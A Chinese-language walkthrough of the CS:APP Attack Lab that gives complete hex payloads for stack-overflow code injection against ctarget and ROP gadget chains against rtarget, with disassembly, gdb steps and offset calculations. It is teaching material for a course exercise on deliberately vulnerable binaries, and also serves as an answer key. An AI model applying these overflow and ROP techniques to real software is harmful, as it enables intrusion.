---
title: CSAPP-attack lab思路
order: 4
---

**在此感谢本文主要笔者 25级开发组成员 Chord**

# Attack-lab 学习思路

这是 Attack-lab 的学习思路参考,在此之前请先按照学习路线学习前几个 lab 的相关知识

接下来我们正式开始

## 下载

在[官网](https://csapp.cs.cmu.edu/3e/labs.html)处下载好压缩包之后解压我们便可以开始学习了

## README 部分

以下是 readme 的文本翻译
```txt
这个文件包含一份特定版本的 Attack Lab 实验材料
各文件说明：
ctarget
  存在代码注入漏洞的 Linux 可执行程序,用于实验的第 1～3 关
rtarget
  存在面向返回编程（ROP）漏洞的 Linux 可执行程序,用于实验的第 4～5 关
cookie.txt
  文本文件,保存本次实验需要使用的 4 字节标识值,可以把它理解为这份实验专属的验证码
farm.c
  rtarget 中 gadget farm 的源代码,你可以使用 -Og 编译选项编译它,再进行反汇编,寻找可用的 gadget,也就是用于拼接 ROP 的短指令片段
hex2raw
  用于生成原始字节序列的工具,具体用法见实验讲义: 例如,把文本形式的 41 42 43 转换成实际的三个字节,对应字符 ABC
```

因而我们可知
ctarget 和 rtarget 是存放我们1-3, 4-5个phase的可执行文件
farm.c 是我们 rtarget 指定区域的源码
hex2raw 是我们的工具文件,用来将我们输入的 16 进制文本转换成字节
cookie.txt 保存实验给定的标识值

## ctarget 导入

随即我们赶快开始 ctarget 的闯关!
```bash
./ctarget -q
```

这时程序会要求我们输入一行字符串,输入后会显示
```txt
No exploit.  Getbuf returned 0x1
```

所以解题的关键看来是这个 Getbuf 函数了,你懂的

我们接下来对 Getbuf 进行反编译便可得到如下内容
```txt
0x00000000004017a8 <+0>:	sub    $0x28,%rsp
0x00000000004017ac <+4>:	mov    %rsp,%rdi
0x00000000004017af <+7>:	call   0x401a40 <Gets>
0x00000000004017b4 <+12>:	mov    $0x1,%eax
0x00000000004017b9 <+17>:	add    $0x28,%rsp
0x00000000004017bd <+21>:	ret
```

rdi 将刚借的 40byte 空间的首地址给了 Gets 函数,随后 eax = 1 是给函数一个返回值

可见程序正常结束显示 `no exploit` 缓存并没有溢出,那么为了不让函数正常返回 1,我们需要让栈溢出,已知该程序申请了 40byte 空间,我们要让 return 不正常进行就需要覆盖 ret(8byte 地址空间) 的相关内容,通过覆盖 ret 的方法我们可以跳转到指定的函数而不是原父级函数,因此我们需要先知道我们应该跳转到哪个函数

我们不妨先看原 ret 里面存了什么地址
```txt
break *0x4017b4      # 在 Gets 返回,还没拆栈的地方下断点
run -q
x/6gx $rsp           # 打印从 rsp 开始的 6 个 8 字节,第六个刚好是 ret 存的地址
```

得到
```txt
(gdb) x/6gx $rsp
0x5561dc78:	0x0000000000003231	0x0000000000000000
0x5561dc88:	0x0000000000000000	0x0000000000000000
0x5561dc98:	0x0000000055586000	0x0000000000401976
```

可知 `0x401976` 是我们 ret 指向的地址,我们不妨再往下看,看回到父级函数他会拿我们的返回值做什么
```txt
x/6i 0x401976
```

得到
```txt
# call Getbuf()
0x401976 <test+14>:	mov    %eax,%edx
0x401978 <test+16>:	mov    $0x403188,%esi
0x40197d <test+21>:	mov    $0x1,%edi
0x401982 <test+26>:	mov    $0x0,%eax
0x401987 <test+31>:	call   0x400df0 <__printf_chk@plt>
0x40198c <test+36>:	add    $0x8,%rsp
```

可见拿到返回值后父级函数并没有对他做什么而是直接输出我们之前看到的返回结果,所以这里并没有我们想要的目标地址

看来我们只好看这个程序的函数列表了,用静态查询的方式去找有哪些函数可用
```bash
nm ctarget | grep ' T '
```

而在输出中有这几个函数名值得我们注意
```txt
0000000000401968 T test
00000000004017c0 T touch1
00000000004017ec T touch2
00000000004018fa T touch3
```

readme 里面就说了有 3 关而仅有 touch 有 3 个系列函数,我们不妨认为这就是我们的目标,而 test 函数则是刚刚我们找到的父级函数名(各位可以自己探索该函数)

至此我们终于发现了 3 个关卡的入口了quq

### touch1

反编译 touch1 可得到下面内容
```txt
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	call   0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	call   0x400e40 <exit@plt>
```

可见这里只是个显示你成功的函数将 1 存入 vlevel 之后表示你通过第一关

所以我们需要让 ret 跳转地址跳到 touch1 处,我们已知 touch1 的地址是 0x4017c0 所以我们需要写一个 48byte 的 16 进制文件转成二进制注入程序
```txt
比如:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 # 这里面是十六进制所以 00 是一个 byte 这里有 48 个 byte
```

再调用工具
```bash
./hex2raw -i change.txt > change.raw # change.txt 为自己创建的
```

注入文件
```bash
./ctarget -q < change.raw
```

至此第一个 touch1 就成了

### touch2

接着我们来看 touch2
```txt
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	call   0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	call   0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
```

这里可以看到需要进行一个 cookie 的比较 
```txt
cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie> 
```

为此我们需要在进入 touch2 前对 rdi 进行修改,修改成我们已有的 cookie 文件
```txt
0x59b997fa
```

我们知道子函数返回时会通过 ret 返回到父函数位置,然后将 ret 指定的地址传给 rip 告诉 cpu 从该处继续执行指令,这里就是我们的突破口

我们需要通过 ret 来修改 rip 的指向地址,从而调用我们自己写的指令修改 rdi

具体怎么做呢?

这次我们写入的值为
```txt
bf fa 97 b9 59 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```

看第六行,不知各位对第六行指定的地址有没有印象,`0x5561dc78` 这里刚好是执行完 Gets 函数时 rsp 即缓存的首地址,通过该地址我们可以让 cpu 执行前 5 行的指令,所以我们便在第一行写入
```txt
bf fa 97 b9 59 c3 00 00 # bf 是 $rdi 的 16 进制编码, c3 是 ret 的 16 进制的编码
```

翻译过来意思是汇编 rdi = 0x59b997fa; ret;

这样 rip = 0x5561dc78, cpu 会执行我们写好的 rdi = 0x59b997fa,我们就成功把 cookie 写入 rdi 了,随后同 touch1 的方法我们注入程序进入 touch2
```bash
./hex2raw -i change.txt > change.raw
./ctarget -q < change.raw
```

至此我们完成了 touch2

### touch3

接下来我们来看 touch3 
```txt
   0x00000000004018fa <+0>:	push   %rbx
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	call   0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	call   0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	call   0x400e40 <exit@plt>
```

我们可以看到在 hexmatch 判断后,如果符合相同条件则会跳转最终会执行到 fail 函数,这并不是我们所期望的所以,我们需要让这个判断为否,即 test %eax, %eax 返回标识符不为 0,即 eax 不为 0

那么 hexmatch 是怎么运作的呢?我们不妨来看看

```txt
   0x000000000040184c <+0>:	push   %r12
   0x000000000040184e <+2>:	push   %rbp
   0x000000000040184f <+3>:	push   %rbx
   0x0000000000401850 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000401854 <+8>:	mov    %edi,%r12d
   0x0000000000401857 <+11>:	mov    %rsi,%rbp
   0x000000000040185a <+14>:	mov    %fs:0x28,%rax
   0x0000000000401863 <+23>:	mov    %rax,0x78(%rsp)
   0x0000000000401868 <+28>:	xor    %eax,%eax
   0x000000000040186a <+30>:	call   0x400db0 <random@plt>
   0x000000000040186f <+35>:	mov    %rax,%rcx
   0x0000000000401872 <+38>:	movabs $0xa3d70a3d70a3d70b,%rdx
   0x000000000040187c <+48>:	imul   %rdx
   0x000000000040187f <+51>:	add    %rcx,%rdx
   0x0000000000401882 <+54>:	sar    $0x6,%rdx
   0x0000000000401886 <+58>:	mov    %rcx,%rax
   0x0000000000401889 <+61>:	sar    $0x3f,%rax
   0x000000000040188d <+65>:	sub    %rax,%rdx
   0x0000000000401890 <+68>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000401894 <+72>:	lea    (%rax,%rax,4),%rax
   0x0000000000401898 <+76>:	shl    $0x2,%rax
   0x000000000040189c <+80>:	sub    %rax,%rcx
   0x000000000040189f <+83>:	lea    (%rsp,%rcx,1),%rbx
   0x00000000004018a3 <+87>:	mov    %r12d,%r8d
   0x00000000004018a6 <+90>:	mov    $0x4030e2,%ecx
   0x00000000004018ab <+95>:	mov    $0xffffffffffffffff,%rdx
   0x00000000004018b2 <+102>:	mov    $0x1,%esi
   0x00000000004018b7 <+107>:	mov    %rbx,%rdi
   0x00000000004018ba <+110>:	mov    $0x0,%eax
   0x00000000004018bf <+115>:	call   0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:	mov    $0x9,%edx
   0x00000000004018c9 <+125>:	mov    %rbx,%rsi
   0x00000000004018cc <+128>:	mov    %rbp,%rdi
   0x00000000004018cf <+131>:	call   0x400ca0 <strncmp@plt>
   0x00000000004018d4 <+136>:	test   %eax,%eax
   0x00000000004018d6 <+138>:	sete   %al
   0x00000000004018d9 <+141>:	movzbl %al,%eax
   0x00000000004018dc <+144>:	mov    0x78(%rsp),%rsi
   0x00000000004018e1 <+149>:	xor    %fs:0x28,%rsi
   0x00000000004018ea <+158>:	je     0x4018f1 <hexmatch+165>
   0x00000000004018ec <+160>:	call   0x400ce0 <__stack_chk_fail@plt>
   0x00000000004018f1 <+165>:	sub    $0xffffffffffffff80,%rsp
   0x00000000004018f5 <+169>:	pop    %rbx
   0x00000000004018f6 <+170>:	pop    %rbp
   0x00000000004018f7 <+171>:	pop    %r12
   0x00000000004018f9 <+173>:	ret
```

我们倒着路由可以发现,再判断 eax = 0 成立后 eax & eax 的标识符会传给 al 进而传给 eax(即 eax = 1),也就是说要使 eax 返回后值不为 0 我们需要让 eax 在这个函数内值变为 0(~~~总感觉哪里怪怪的~~~)

那么关键就在于 strncmp 这个函数(指令地址: 0x4018cf)

这个函数接收三个参 strncmp(rdi, rsi, edx)
> 其中 edx = 9, rsi = rbx = rsp + random % 100 的随机值指向地址, rdi = rbp = 父函数 rdi(你填入的字符串的起始地址)  
> 这里取 100 内随机值,就是为了防止~~~我们~~~黑客直接获取答案的,虽然用 100 的枚举方式也可以得到答案

我们可以知道比较的两个字符串的大小都为 9 一个写在 rsi 指向的位置,一个写在 rdi 指向位置,其中 rsi 指向位置写入的是 r12d 即 edi(cookie) 的内容

那么思路就很清晰了,我们需要修改 rdi 的值使其指向我们写好的字符串(cookie 内容)的首地址,然后跳转到 touch3 就可以了

因而这次我们的写入值是:
```txt
48 bf a8 dc 61 55 00 00 # 48 bf -> movabs 0x5561dca8, %rdi(movabs 这里要动 8 字节数据,高位要补齐 4 字节)
00 00 68 fa 18 40 00 c3 # 这里是 68->push, 0x4018fa, c3->ret
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # 缓冲区起始位置
35 39 62 39 39 37 66 61 # 此处为 cookie 字符串(9 字节)
00
```
> 字符串地址可以计算,是我们缓冲区起点 + 48 字节之后的位置,即: 0x5561dc78 + 0x30 = 0x5561dca8
> 这里 hexmatch 会占用栈 8~40 的空间,cookie 写入不够所以我们放在 40~48 的位置

同样我们注入这个内容
```bash
./hex2raw -i change.txt > change.raw
./ctarget -q < change.raw
```

至此 touch3 便完成了

## rtarget 导入

现在我们来进行 rtarget 的闯关

先试着运行下:
```bash
./rtarget -q
```

会发现输出形式还是同 ctarget 那么我们同样对 Getbuf 函数进行解析

```txt
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401b60 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret
```

可以看到这里借了 40byte 的空间所以,我们不妨猜想是跟 ctarget 一样:进入某种函数的方式来通关

不过根据官方的教材的提示:
```txt
从这部分开始,程序被编译成栈不可执行,所以你不能再用注入代码的办法
你需要用 ROP (返回导向编程),从程序已有的代码里找 gadget 拼出你要的功能,farm.c 里包含了一批可以被用作 gadget 的函数
```

我们可以知道 rtarget 使用的是 rw-p 的栈,即 可读,可写的私有映射(不具备 `X` 执行程序的权限)

我们在 gdb 对 getbuf 设置断点后,运行,输入如下信息可以同样印证:
```txt
info proc mappings
```

得到

|Start Addr|End Addr|Size|Offset|Perms File|
|:---:|:---:|:---:|:---:|:---:|
|0x00007ffffffab000|0x00007ffffffff000|0x54000|0x0|rw-p  [stack]|

表明这是个 rw-p 栈

在 rw-p 栈里我们仍然可以对栈写入信息,数据,但是不能像 touch3 一样让 ret 返回后在栈上执行我们写好的指令(我们没有执行程序的权限),也就是说 cpu 在读取 %rip 位置后把我们写入的内容抛页错误(X = 0),这无疑加大了我们通关的难度

这里讲讲`页表检查`只想看做题思路的可以跳过此处
<details>
<summary>点击查看</summary>

现在 cpu 架构一般使用`四级表`(当然也存在五级表),顾名思义这是一个四级嵌套的查找表

分别是:
```txt
CR3 -> PML4 -> PDPT -> PD -> PT -> 物理页
CR3:  CPU 控制寄存器,指向当前调用的 PML4 的物理地址
PML4:   设有 512 项(覆盖256TB)
PDPT:   设有 512 项(覆盖512GB)
PD:     设有 512 项(覆盖1GB)
PT:     设有 512 页(覆盖2MB)
物理页: 4KB
```

它类似嵌套的指针数组, cpu 通过 CR3,以及虚拟内存的地址拆分成(9+9+9+9+12)五个部分进行索引,最后找到实际的物理地址

而每一个页表都存有权限位,该权限对所有子项生效,且权限是层级生效的,比如:
```txt
PML4[0]:  RW  U  NX=0
  PDPT:   RW  U  NX=0
    PD:   RW  U  NX=0
      PT: R   U  NX=1 → 最终：只读、不可执行
```
> R/W,U/S 取与, NX 取或

高一级的权限会影响下一级,使权限受限

所以进行页表检查时 cpu 获取 %rip 地址后通过查询找到对应的物理页,然后看是否有取指权限,如果没有则会报页错误

</details>

所以留给我们的方法只有一个,就是通过 ret 的不断跳转,来修改值,用程序现有的函数组合成一个新函数,来实现我们的目的,这便是 ROP 编程(返回导向编程)

farm.c 便是我们的突破口,我们可以用这些提供的函数来"拼积木"

同样我们先获取函数列表
```bash
nm ctarget | grep ' T '
```

可以看到
```txt
0x4017c0 T touch1
0x4017ec T touch2
0x4018fa T touch3
0x401994 T start_farm
0x401ab2 T end_farm
```

就可以正式开始了

### farm 各个函数的解析

由于我们会用到各个函数,我们不妨直接对所有这些函数 dump 下:
```bash
objdump -d rtarget --start-address=0x401994 --stop-address=0x401ab2
```

这里从 start_farm 读到 end_farm

我们这里用 dump 按地址查询是为了看机器码而不是符号,因为我们能通过 ret 让 cpu 在函数中的不同位置让机器码重新组合从而产生新的指令效果

<details>

<summary>点开查看读取结果</summary>

```txt
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	ret

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	ret

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	ret

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	ret

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	ret

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	ret

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	ret

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	ret

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	ret

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	ret

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	ret

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	ret

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	ret

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	ret

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	ret

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	ret

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	ret

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	ret

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	ret

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	ret

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	ret

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	ret

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	ret

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	ret

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	ret

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	ret

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	ret

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	ret

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	ret

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	ret

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	ret

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	ret

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	ret

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	ret

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	ret
```

</details>

### touch1

touch1 同 ctarget 的 touch1,只用修改 ret 值就可以了,因此不再讲解

### touch2

我们先反汇编
```txt
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x203ce0(%rip)        # 0x6054dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x203ce2(%rip),%edi        # 0x6054e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x403208,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	call   0x401dad <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403230,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	call   0x401e6f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
```

其实不难发现这跟 ctarget 的 touch2 一模一样可见,我们现在要做的只有一个,把 %rdi 修改为 cookie 的内容,但是注意这次我们并不能自己写指令

同 ctarget 的方法,我们大致需要这样写:
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 # getval_280 + 2
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # addval_273 + 2
ec 17 40 00 00 00 00 00 # touch2
```

先把 40byte 缓冲区填满  
然后我们需要一个能让函数在栈上取指的指令,恰巧 getval_280 函数有我们要的 58 90 c3(即 pop %rax, ret)  
同时我们还需要一个能让 %rdi = %rax 的指令,恰巧 addval_273 函数有我们要的 48 89 c7 c3(即 mov %rax,%rdi, ret)
这样我们就可以让 %rdi = cookie 了  
最后便是弹到 touch2  
> 注意一点,我们取的是机器码,而不是调用整个函数,所以每次 ret 指向的地址要按照我们的实际需求计算偏移值

我们赶紧试试吧(^p^):
```bash
./hex2raw -i change.txt > change.raw
./rtarget -q < change.raw
```

那么恭喜你掌握了 ROP 的精髓!

### touch3

同 ctarget touch3 的需求,我们需要让 %rdi = cookie 的地址,然后跳转到 touch3 就可以了,所以你想好怎么做了吗?

我们可以通过 touch2 的 rdi = rax 方式让 rdi 赋值,但前提是我们要知道字符串的地址而这是一个内核管理的栈,每次栈的地址是随机的,所以我们需要实时计算出目前我们字符串的地址  
为此我们需要得到 rsp 以及对应的偏移值,有了这两个通过相加的函数返回给 rax,这样我们就成了

#### 主要步骤

这里我们会这么想
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 # getval_280 + 2
20 00 00 00 00 00 00 00 # 你自定义的数值(0x20)
dd 19 40 00 00 00 00 00 # getval_481 + 2
34 1a 40 00 00 00 00 00 # getval_159 + 1
13 1a 40 00 00 00 00 00 # addval_436 + 2
06 1a 40 00 00 00 00 00 # addval_190 + 3
a2 19 40 00 00 00 00 00 # addval_273 + 2
d6 19 40 00 00 00 00 00 # add_xy
a2 19 40 00 00 00 00 00 # addval_273 + 2
fa 18 40 00 00 00 00 00 # touch3
35 39 62 39 39 37 66 61 # 此处为 cookie 字符串(9 字节)
00
```

这里我们有三个主要部分要做 1.得到偏移值赋值给 %rsi 2.得到栈的地址赋值给 %rdi 3.两者相加为字符串地址

part 1
getval_280 + 2 效果是: pop %rax
getval_481 + 2 效果是: mov %eax,%edx
getval_159 + 1 效果是: mov %edx,%ecx | cmp %cl,%cl
addval_436 + 2 效果是: mov %ecx,%esi(通过低位覆盖让 %rsi 值变化)
> 通过该方法我们可以让 %esi 等于任意我们想存入的数值这里 %esi 存的是偏移值所以我们要提前做偏移计算,计算后文再讲

part 2
addval_190 + 3 的效果是: mov %rsp,%rax
addval_273 + 2 这里我们再让 %rdi = %rax 把当前 %rsp 的地址存到 %rdi

part 3
add_xy         的效果是: lea (%rdi,%rsi,1),%rax  
addval_273 + 2 随后 %rdi = %rax 大功告成

#### 偏移值计算:

由于我们是先给 %esi 赋值,再取 %rsp,所以我们依照此时 %rsp 的位置进行偏移值计算

以缓存区开头为 +0 计算,在调用 addval_190 + 3(mov %rsp,%rax) 前, %rsp 在 +80 处,调用后由于需要标记下一条指令的地址, %rsp + 8 即 +88 处,可知我们存放的是 +88 处的地址

字符串存放位置在 +120,则可知偏移值为 x = (+120) - (+88) = 32 = 0x20

#### 答案验证

赶快试试(^&^):
```bash
./hex2raw -i change.txt > change.raw
./rtarget -q < change.raw
```

至此恭喜你完成了 Attack-lab 的学习内容,这一路可~~~真不容易~~~

## 其他

1.对于机器码翻译:
可以上该网站进行查询 [点击跳转](felixcloutier.com/x86)